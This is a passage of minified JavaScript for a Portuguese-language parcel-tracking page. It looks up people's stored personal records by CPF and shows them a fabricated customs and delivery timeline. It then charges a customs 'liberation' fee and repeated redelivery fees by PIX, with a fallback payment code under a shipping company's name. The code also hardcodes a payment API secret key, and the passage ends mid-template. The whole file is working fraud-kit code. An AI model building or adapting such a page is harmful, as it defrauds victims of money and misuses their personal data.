import"./modulepreload-polyfill-B5Qt9EMX.js";/* empty css              */import{D as h}from"./database-CTJo1PQf.js";import{C as y}from"./cpf-validator-B4PsRAE6.js";import{N as f}from"./navigation-BwbyOJod.js";class p{static showLoadingNotification(){const e=document.createElement("div");e.id="trackingNotification",e.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const t=document.createElement("div");if(t.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #ff6b35;
        `,t.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-search" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Identificando Pedido...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Aguarde enquanto rastreamos seu pacote
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
                Processando informações...
            </p>
        `,e.appendChild(t),document.body.appendChild(e),document.body.style.overflow="hidden",!document.getElementById("trackingAnimations")){const o=document.createElement("style");o.id="trackingAnimations",o.textContent=`
                @keyframes progressBar {
                    from { width: 0%; }
                    to { width: 100%; }
                }
                @keyframes fadeIn {
                    from { opacity: 0; }
                background: #1e4a6b;
                }
                @keyframes slideUp {
                    from { opacity: 0; transform: translateY(50px); }
                    to { opacity: 1; transform: translateY(0); }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                box-shadow: 0 4px 15px rgba(30, 74, 107, 0.4);
            `,document.head.appendChild(o)}}static closeLoadingNotification(){const e=document.getElementById("trackingNotification");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}static showError(e){const t=document.querySelector(".error-message");t&&t.remove();const o=document.createElement("div");o.className="error-message",o.style.cssText=`
            background: #fee;
            color: #c33;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid #fcc;
            text-align: center;
            font-weight: 500;
            animation: slideDown 0.3s ease;
        `,o.textContent=e;const a=document.querySelector(".tracking-form");a&&o instanceof Node?(a.appendChild(o),setTimeout(()=>{o.parentNode&&(o.style.animation="slideUp 0.3s ease",setTimeout(()=>o.remove(),300))},5e3)):a&&!o instanceof Node&&console.error("Error: errorDiv is not a valid DOM Node",o)}static scrollToElement(e,t=0){if(!e)return;const a=e.getBoundingClientRect().top+window.pageYOffset-t;window.scrollTo({top:a,behavior:"smooth"})}static animateTimeline(){document.querySelectorAll(".timeline-item").forEach((t,o)=>{setTimeout(()=>{t.style.opacity="1",t.style.transform="translateY(0)"},o*100)})}}class v{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_ab923f7fd51de54a45f835645cae6c73c9ac37e65e28b79fd7d13efb030d74c6cebab32534d07a5f80a871196121732a129ef02e3732504b1a56b8d1972ebbf1";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var o,a;try{const i=Date.now(),s=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const n=e.email||this.generateUniqueEmail(i),l=e.telefone||this.generateUniquePhone(i);console.log("📧 Email usado:",n),console.log("📱 Telefone usado:",l);const r={external_id:s,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:n,phone:l,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:r.external_id,total_amount:`R$ ${r.total_amount.toFixed(2)}`,payment_method:r.payment_method,webhook_url:r.webhook_url,ip:r.ip,customer:{name:r.customer.name,document:r.customer.document,email:r.customer.email,phone:r.customer.phone,document_type:r.customer.document_type}});const c={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":c["Content-Type"]});const m=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:c,body:JSON.stringify(r)});if(console.log("📡 Status da resposta:",m.status),console.log("📡 Headers da resposta:",Object.fromEntries(m.headers.entries())),!m.ok){const g=await m.text();throw console.error("❌ Erro na API Zentra Pay:",{status:m.status,statusText:m.statusText,body:g,headers:Object.fromEntries(m.headers.entries())}),new Error(`Erro na API: ${m.status} - ${g}`)}const d=await m.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:d.transaction_id||d.id,external_id:d.external_id,has_pix_payload:!!((o=d.pix)!=null&&o.payload),has_qr_code:!!((a=d.pix)!=null&&a.qr_code),status:d.status,payment_method:d.payment_method}),!d.pix||!d.pix.payload)throw console.error("❌ Resposta incompleta da API:",d),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",d.pix.payload),{success:!0,externalId:s,pixPayload:d.pix.payload,qrCode:d.pix.qr_code||null,transactionId:d.transaction_id||d.id,email:n,telefone:l,valor:t,status:d.status||"pending",paymentMethod:d.payment_method||"PIX",timestamp:i}}catch(i){return console.error("💥 Erro ao criar transação PIX:",{message:i.message,stack:i.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:i.message,details:i.stack}}}getClientIP(){return"8.8.8.8"}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class x{constructor(){this.dbService=new h,this.currentCPF=null,this.trackingData=null,this.leadData=null,this.zentraPayService=new v,this.isInitialized=!1,this.pixData=null,this.paymentErrorShown=!1,this.paymentRetryCount=0,this.deliveryValues=[7.74,12.38,16.46],this.deliveryAttempts=0,this.deliveryPixData=null,console.log("TrackingSystem inicializado - DADOS DO BANCO"),this.initWhenReady()}initWhenReady(){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",()=>this.init()):this.init(),setTimeout(()=>this.init(),100),setTimeout(()=>this.init(),500),setTimeout(()=>this.init(),1e3)}init(){if(!this.isInitialized){console.log("Inicializando sistema de rastreamento baseado no banco...");try{this.setupEventListeners(),this.handleAutoFocus(),this.clearOldData(),this.validateZentraPaySetup(),this.isInitialized=!0,console.log("Sistema de rastreamento inicializado com sucesso")}catch(e){console.error("Erro na inicialização:",e),setTimeout(()=>{this.isInitialized=!1,this.init()},1e3)}}}validateZentraPaySetup(){this.zentraPayService.validateApiSecret()?console.log("✅ API Zentra Pay configurada corretamente"):console.error("❌ Problema na configuração da API Zentra Pay")}setupEventListeners(){console.log("Configurando event listeners..."),this.setupFormSubmission(),this.setupCPFInput(),this.setupTrackButton(),this.setupModalEvents(),this.setupCopyButtons(),this.setupAccordion(),this.setupKeyboardEvents(),console.log("Event listeners configurados")}setupFormSubmission(){const e=document.getElementById("trackingForm");e&&(console.log("Form encontrado por ID"),e.addEventListener("submit",t=>{t.preventDefault(),t.stopPropagation(),console.log("Form submetido via ID"),this.handleTrackingSubmit()})),document.querySelectorAll("form").forEach((t,o)=>{console.log(`Configurando form ${o}`),t.addEventListener("submit",a=>{a.preventDefault(),a.stopPropagation(),console.log(`Form ${o} submetido`),this.handleTrackingSubmit()})})}setupTrackButton(){console.log("Configurando botão de rastreamento...");const e=document.getElementById("trackButton");e&&(console.log("Botão encontrado por ID: trackButton"),this.configureTrackButton(e)),document.querySelectorAll(".track-button").forEach((t,o)=>{console.log(`Configurando botão por classe ${o}`),this.configureTrackButton(t)}),document.querySelectorAll('button[type="submit"], button').forEach((t,o)=>{t.textContent&&t.textContent.toLowerCase().includes("rastrear")&&(console.log(`Configurando botão por texto ${o}: ${t.textContent}`),this.configureTrackButton(t))}),document.addEventListener("click",t=>{const o=t.target;o&&o.tagName==="BUTTON"&&o.textContent&&o.textContent.toLowerCase().includes("rastrear")&&(t.preventDefault(),t.stopPropagation(),console.log("Botão rastrear clicado via delegação"),this.handleTrackingSubmit())})}configureTrackButton(e){const t=e.cloneNode(!0);e.parentNode.replaceChild(t,e),t.addEventListener("click",o=>{o.preventDefault(),o.stopPropagation(),console.log("Botão rastrear clicado:",t.id||t.className),this.handleTrackingSubmit()}),t.style.cursor="pointer",t.style.pointerEvents="auto",t.removeAttribute("disabled"),t.type!=="submit"&&(t.type="button"),console.log("Botão configurado:",t.id||t.className)}setupCPFInput(){const e=document.getElementById("cpfInput");if(!e){console.warn("Campo CPF não encontrado");return}console.log("Configurando campo CPF..."),e.addEventListener("input",t=>{y.applyCPFMask(t.target),this.validateCPFInput()}),e.addEventListener("keypress",t=>{this.preventNonNumeric(t)}),e.addEventListener("keydown",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}),e.addEventListener("paste",t=>{t.preventDefault();const a=(t.clipboardData||window.clipboardData).getData("text").replace(/[^\d]/g,"");a.length<=11&&(e.value=a,y.applyCPFMask(e),this.validateCPFInput())}),e.addEventListener("focus",()=>{e.setAttribute("inputmode","numeric")}),console.log("Campo CPF configurado")}preventNonNumeric(e){[8,9,27,13,46,35,36,37,38,39,40].includes(e.keyCode)||e.keyCode===65&&e.ctrlKey||e.keyCode===67&&e.ctrlKey||e.keyCode===86&&e.ctrlKey||e.keyCode===88&&e.ctrlKey||(e.shiftKey||e.keyCode<48||e.keyCode>57)&&(e.keyCode<96||e.keyCode>105)&&e.preventDefault()}validateCPFInput(){const e=document.getElementById("cpfInput"),t=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');if(!e)return;const o=y.cleanCPF(e.value);t.forEach(a=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(o.length===11?(a.disabled=!1,a.style.opacity="1",a.style.cursor="pointer",e.style.borderColor="#27ae60"):(a.disabled=!0,a.style.opacity="0.7",a.style.cursor="not-allowed",e.style.borderColor=o.length>0?"#e74c3c":"#e9ecef"))})}async handleTrackingSubmit(){console.log("=== INICIANDO BUSCA APENAS NO BANCO ===");const e=document.getElementById("cpfInput");if(!e){console.error("Campo CPF não encontrado"),this.showError("Campo CPF não encontrado. Recarregue a página.");return}const t=e.value,o=y.cleanCPF(t);if(console.log("CPF digitado:",t),console.log("CPF limpo:",o),!y.isValidCPF(t)){console.log("CPF inválido"),this.showError("Por favor, digite um CPF válido com 11 dígitos.");return}console.log("CPF válido, buscando APENAS no banco..."),this.showLoadingNotification();const a=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]'),i=[];a.forEach((s,n)=>{s.textContent&&s.textContent.toLowerCase().includes("rastrear")&&(i[n]=s.innerHTML,s.innerHTML='<i class="fas fa-spinner fa-spin"></i> Consultando...',s.disabled=!0)});try{await new Promise(n=>setTimeout(n,1500)),console.log("🔍 Buscando no banco de dados...");const s=await this.getLeadFromLocalStorage(o);if(s.success&&s.data){console.log("✅ LEAD ENCONTRADO NO BANCO!"),console.log("📦 Dados do lead:",s.data),this.leadData=s.data,this.currentCPF=o,this.closeLoadingNotification(),console.log("📋 Exibindo dados do banco..."),this.displayOrderDetailsFromDatabase(),this.generateRealTrackingData(),this.displayTrackingResults(),this.saveTrackingData();const n=document.getElementById("orderDetails");n&&this.scrollToElement(n,100),setTimeout(()=>{this.highlightLiberationButton()},1e3)}else console.log("❌ CPF não encontrado no banco"),this.closeLoadingNotification(),this.showCpfNotFoundDialog(),setTimeout(()=>{this.showDiscreteHelpPopup()},2e3)}catch(s){console.error("Erro no processo:",s),this.closeLoadingNotification(),this.showError("Erro ao consultar CPF. Tente novamente.")}finally{a.forEach((s,n)=>{s.textContent&&i[n]&&(s.innerHTML=i[n],s.disabled=!1)}),this.validateCPFInput()}}async getLeadFromLocalStorage(e){return await this.dbService.getLeadByCPF(e)}displayOrderDetailsFromDatabase(){if(!this.leadData)return;console.log("📋 Exibindo dados do banco de dados");const e=this.getFirstAndLastName(this.leadData.nome_completo||"Nome não informado"),t=y.formatCPF(this.leadData.cpf||"");this.updateElement("customerName",e),this.updateElement("fullName",this.leadData.nome_completo||"Nome não informado"),this.updateElement("formattedCpf",t),this.updateElement("customerNameStatus",e);let o="Produto não informado";this.leadData.produtos&&this.leadData.produtos.length>0&&(o=this.leadData.produtos[0].nome||"Produto não informado"),this.updateElement("customerProduct",o);const a=this.leadData.endereco||"Endereço não informado";this.updateElement("customerFullAddress",a),console.log("✅ Interface atualizada com dados do banco"),console.log("👤 Nome exibido:",e),console.log("📄 Nome completo:",this.leadData.nome_completo),console.log("📍 Endereço:",a),console.log("📦 Produto:",o),this.showElement("orderDetails"),this.showElement("trackingResults")}generateRealTrackingData(){if(console.log("📦 Gerando dados de rastreamento reais do banco"),!this.leadData){console.error("❌ leadData não encontrado para gerar tracking");return}const e=this.leadData.etapa_atual||1,t=this.getStageNames();console.log("📊 Gerando etapas até:",Math.max(e,29)),this.trackingData={cpf:this.leadData.cpf,currentStep:e,steps:[],liberationPaid:this.leadData.status_pagamento==="pago",liberationDate:this.leadData.status_pagamento==="pago"?new Date().toISOString():null,deliveryAttempts:0,lastUpdate:this.leadData.updated_at||new Date().toISOString()};const o=Math.max(e,29);for(let a=1;a<=o;a++){const i=new Date;i.setHours(i.getHours()-(Math.max(e,11)-a));const s={id:a,date:i,title:t[a]||`Etapa ${a}`,description:t[a]||`Etapa ${a}`,isChina:a>=3&&a<=7,completed:a<=e,needsLiberation:a===11&&this.leadData.status_pagamento!=="pago"};s.id&&s.description?this.trackingData.steps.push(s):console.error("❌ Dados de etapa inválidos:",s)}console.log("✅ Dados de rastreamento gerados:",{totalSteps:this.trackingData.steps.length,currentStage:e,stepsGenerated:this.trackingData.steps.map(a=>a.id)}),console.log("📊 Etapa atual:",e),console.log("💳 Status pagamento:",this.leadData.status_pagamento)}getStageNames(){return{1:"Seu pedido foi criado",2:"O seu pedido está sendo preparado para envio",3:"[China] O vendedor enviou seu pedido",4:"[China] O pedido chegou ao centro de triagem de Shenzhen",5:"[China] Pedido saiu do centro logístico de Shenzhen",6:"[China] Coletado. O pedido está em trânsito internacional",7:"[China] O pedido foi liberado na alfândega de exportação",8:"Pedido saiu da origem: Shenzhen",9:"Pedido chegou no Brasil",10:"Pedido em trânsito para CURITIBA/PR",11:"Pedido chegou na alfândega de importação: CURITIBA/PR",12:"Pedido liberado na alfândega de importação",13:"Pedido sairá para entrega",14:"Pedido em trânsito entrega",15:"Pedido em rota de entrega",16:"Tentativa entrega",17:"1ª Tentativa de entrega - Taxa de reenvio necessária",18:"Reagendamento da entrega",19:"Pedido em trânsito para nova entrega",20:"Pedido em rota de entrega",21:"2ª Tentativa de entrega - Taxa de reenvio necessária",22:"Reagendamento da entrega",23:"Pedido em trânsito para nova entrega",24:"Pedido em rota de entrega",25:"3ª Tentativa de entrega - Taxa de reenvio necessária",26:"Reagendamento da entrega",27:"Pedido em trânsito para nova entrega",28:"Pedido em rota de entrega",29:"4ª Tentativa de entrega - Taxa de reenvio necessária"}}displayTrackingResults(){this.updateStatus(),this.renderTimeline(),setTimeout(()=>{p.animateTimeline()},500)}updateStatus(){const e=document.getElementById("statusIcon"),t=document.getElementById("currentStatus");if(!e||!t)return;let o="";this.leadData&&this.leadData.etapa_atual?o=this.getStageNames()[this.leadData.etapa_atual]||`Etapa ${this.leadData.etapa_atual}`:o="Pedido chegou na alfândega de importação: CURITIBA/PR";const a=this.leadData?this.leadData.etapa_atual:11;a>=17?(e.innerHTML='<i class="fas fa-check-circle"></i>',e.className="status-icon delivered"):a>=13?(e.innerHTML='<i class="fas fa-truck"></i>',e.className="status-icon in-delivery"):a>=12?(e.innerHTML='<i class="fas fa-check-circle"></i>',e.className="status-icon delivered"):(e.innerHTML='<i class="fas fa-clock"></i>',e.className="status-icon in-transit"),t.textContent=o}renderTimeline(){const e=document.getElementById("trackingTimeline");if(!e){console.error("❌ Timeline container não encontrado");return}e.innerHTML="",console.log("🎬 Renderizando timeline...");const t=this.leadData?parseInt(this.leadData.etapa_atual):11;console.log("📊 Etapa atual do lead:",t),this.trackingData.steps.forEach((o,a)=>{if(o&&o.id<=t){const i=o.id===t;try{const s=this.createTimelineItem(o,i);s&&s instanceof Node?(e.appendChild(s),console.log(`✅ Etapa ${o.id} adicionada à timeline`)):console.error(`❌ Elemento inválido para etapa ${o.id}:`,s)}catch(s){console.error(`❌ Erro ao criar/adicionar etapa ${o.id}:`,s)}}else o||console.error(`❌ Step inválido no índice ${a}:`,o)}),console.log("✅ Timeline renderizada com sucesso")}createTimelineItem(e,t){var l;const o=document.createElement("div");o.className=`timeline-item ${e.completed?"completed":""} ${t?"last":""}`,o.style.opacity="0",o.style.transform="translateY(20px)",o.style.transition="all 0.5s ease";const a=e.date instanceof Date?e.date.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}):e.date,i=this.leadData?parseInt(this.leadData.etapa_atual):11;let s="";if(e.id===11&&i<=12&&((l=this.leadData)==null?void 0:l.status_pagamento)!=="pago"&&(s=`
                <button class="liberation-button-timeline" data-step-id="${e.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),this.isDeliveryAttemptStage(e.id)&&e.id===i){const r=this.getAttemptNumber(e.id),c=this.getAttemptValue(r);s=`
                <button class="delivery-button-timeline" data-step-id="${e.id}" data-attempt="${r}" data-value="${c}">
                    <i class="fas fa-truck"></i> LIBERAR ENTREGA
                </button>
            `}const n=e.date instanceof Date?e.date.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"}):e.time||"00:00";if(o.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${a}</span>
                    <span class="time">${n}</span>
                </div>
                <div class="timeline-text">
                    <p>${e.isChina?'<span class="china-tag">[China]</span>':""}${e.description}</p>
                    ${s}
                </div>
            </div>
        `,e.id===11&&e.completed){const r=o.querySelector(".liberation-button-timeline");r&&!r.classList.contains("delivery-attempt-button")&&r.addEventListener("click",()=>{this.openLiberationModal()})}if(e.id>=17&&(e.id-17)%4===0&&e.completed){const r=o.querySelector(".delivery-button-timeline");r&&r.addEventListener("click",()=>{const c=parseInt(r.dataset.attempt),m=parseFloat(r.dataset.value);this.openDeliveryModal(c,m)})}return o}getDeliveryAttemptNumber(e){return{16:1,106:2,116:3,126:1}[e]||1}getDeliveryValue(e){return[7.74,12.38,16.46][e-1]||7.74}async handleDeliveryAttemptPayment(e,t){console.log(`💳 Processando pagamento da ${e}ª tentativa - R$ ${t.toFixed(2)}`),this.showDeliveryPaymentLoading(e);try{const o={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone},a=await this.zentraPayService.createPixTransaction(o,t);if(a.success)console.log("🎉 PIX de entrega gerado com sucesso!"),this.deliveryPixData=a,this.closeDeliveryPaymentLoading(),setTimeout(()=>{this.showDeliveryPaymentModal(e,t)},300);else throw new Error(a.error||"Erro ao gerar PIX")}catch(o){console.error("💥 Erro ao gerar PIX de entrega:",o),this.closeDeliveryPaymentLoading(),setTimeout(()=>{this.showDeliveryPaymentModal(e,t,!0)},300)}}showDeliveryPaymentLoading(e){const t=document.createElement("div");t.id="deliveryPaymentLoading",t.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 3000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;const o=document.createElement("div");o.style.cssText=`
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideUp 0.3s ease;
            border: 3px solid #e74c3c;
        `,o.innerHTML=`
            <div style="margin-bottom: 20px;">
                <i class="fas fa-truck" style="font-size: 3rem; color: #e74c3c; animation: pulse 1.5s infinite;"></i>
            </div>
            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
                Gerando PIX de Entrega...
            </h3>
            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
                Processando ${e}ª tentativa de entrega
            </p>
            <div style="margin-top: 25px;">
                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #e74c3c, #c0392b); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
                </div>
            </div>
        `,t.appendChild(o),document.body.appendChild(t),document.body.style.overflow="hidden"}closeDeliveryPaymentLoading(){const e=document.getElementById("deliveryPaymentLoading");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}showDeliveryPaymentModal(e,t,o=!1){const a=document.createElement("div");a.className="modal-overlay",a.id="deliveryPaymentModal",a.style.cssText=`
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        `;let i,s;!o&&this.deliveryPixData&&this.deliveryPixData.pixPayload?(i=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`,s=this.deliveryPixData.pixPayload,console.log("✅ Usando PIX real do Zentra Pay para entrega")):(i="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",s="00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2",console.log("⚠️ Usando PIX estático como fallback para entrega"));const n=e===1?"Liberar Entrega":`${e}ª Tentativa de Reenvio`;a.innerHTML=`
            <div class="professional-modal-container">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">${n}</h2>
                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content">
                    <div class="liberation-explanation">
                        <p class="liberation-subtitle">
                            Para ${e===1?"liberar a entrega":"reagendar a entrega"} do seu pedido, é necessário pagar a taxa de R$ ${t.toFixed(2)}.
                        </p>
                    </div>

                    <div class="professional-fee-display">
                        <div class="fee-info">
                            <span class="fee-label">Taxa de ${e===1?"Liberação de":"Reenvio -"} Entrega</span>
                            <span class="fee-amount">R$ ${t.toFixed(2)}</span>
                        </div>
                    </div>

                    <!-- Seção PIX -->
                    <div class="professional-pix-section">
                        <h3 class="pix-section-title">Pagamento via Pix</h3>
                        
                        <div class="pix-content-grid">
                            <!-- QR Code -->
                            <div class="qr-code-section">
                                <div class="qr-code-container">
                                    <img src="${i}" alt="QR Code PIX Entrega" class="professional-qr-code">
                                </div>
                            </div>
                            
                            <!-- PIX Copia e Cola -->
                            <div class="pix-copy-section">
                                <label class="pix-copy-label">PIX Copia e Cola</label>
                                <div class="professional-copy-container">
                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${s}</textarea>
                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
                                        <i class="fas fa-copy"></i> Copiar Chave PIX
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Instruções de Pagamento -->
                        <div class="professional-payment-steps">
                            <h4 class="steps-title">Como realizar o pagamento:</h4>
                            <div class="payment-steps-grid">
                                <div class="payment-step">
                                    <div class="step-number">1</div>
                                    <div class="step-content">
                                        <i class="fas fa-mobile-alt step-icon"></i>
                                        <span class="step-text">Acesse seu app do banco</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">2</div>
                                    <div class="step-content">
                                        <i class="fas fa-qrcode step-icon"></i>
                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
                                    </div>
                                </div>
                                <div class="payment-step">
                                    <div class="step-number">3</div>
                                    <div class="step-content">
                                        <i class="fas fa-check step-icon"></i>
                                        <span class="step-text">Confirme o pagamento</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Botão de Simulação -->
                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
                            <button id="simulateDeliveryPaymentButton" data-attempt="${e}" style="
                                background: transparent;
                                color: #666;
                                border: 1px solid #ddd;
                                padding: 6px 12px;
                                border-radius: 6px;
                                cursor: pointer;
                                font-weight: 600;
                                transition: all 0.3s ease;
                                opacity: 0.7;
                                font-size: 12px;
                                min-width: 30px;
                                height: 28px;
                            ">
                                --
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `,document.body.appendChild(a),document.body.style.overflow="hidden",this.setupDeliveryPaymentModalEvents(a,e,t),console.log(`💳 Modal de pagamento da ${e}ª tentativa exibido - R$ ${t.toFixed(2)}`)}setupDeliveryPaymentModalEvents(e,t,o){const a=e.querySelector("#closeDeliveryPaymentModal");a&&a.addEventListener("click",()=>{this.closeDeliveryPaymentModal()});const i=e.querySelector("#copyDeliveryPixButton");i&&i.addEventListener("click",()=>{this.copyDeliveryPixCode()});const s=e.querySelector("#simulateDeliveryPaymentButton");s&&s.addEventListener("click",()=>{this.simulateDeliveryPayment(t)}),e.addEventListener("click",n=>{n.target===e&&this.closeDeliveryPaymentModal()})}copyDeliveryPixCode(){const e=document.getElementById("deliveryPixCode"),t=document.getElementById("copyDeliveryPixButton");if(!(!e||!t))try{e.select(),e.setSelectionRange(0,99999),navigator.clipboard&&window.isSecureContext?navigator.clipboard.writeText(e.value).then(()=>{console.log("✅ PIX de entrega copiado"),this.showCopySuccess(t)}).catch(()=>{this.fallbackCopy(e,t)}):this.fallbackCopy(e,t)}catch(o){console.error("❌ Erro ao copiar PIX de entrega:",o)}}simulateDeliveryPayment(e){console.log(`✅ Simulando pagamento da ${e}ª tentativa`),this.closeDeliveryPaymentModal(),setTimeout(()=>{this.processDeliveryPaymentSuccess(e)},1e3)}processDeliveryPaymentSuccess(e){console.log(`🎉 Pagamento da ${e}ª tentativa confirmado!`);const t=document.querySelector(`[data-attempt="${e}"]`);t&&(t.style.display="none"),this.showDeliverySuccessNotification(e),setTimeout(()=>{this.startDeliveryFlow(e)},2e3)}showDeliverySuccessNotification(e){const t=document.createElement("div");t.className="delivery-success-notification",t.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,t.innerHTML=`
            <i class="fas fa-truck" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">${e}ª tentativa liberada.</div>
            </div>
